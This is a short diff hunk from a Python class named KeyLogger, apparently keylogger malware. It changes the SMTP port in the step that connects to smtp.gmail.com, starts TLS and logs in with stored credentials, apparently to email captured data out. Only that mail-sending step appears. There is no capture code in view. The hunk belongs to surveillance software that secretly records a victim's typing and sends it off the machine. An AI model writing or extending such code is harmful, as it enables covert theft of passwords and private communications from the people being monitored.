@@ -87,7 +87,7 @@ class KeyLogger:
         if response == 0:
             # print(hostname, 'is up!')
             # connect to mail server
-            server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+            server = smtplib.SMTP(host="smtp.gmail.com", port=25)
             server.starttls()
             # logging in
             server.login(email, password)
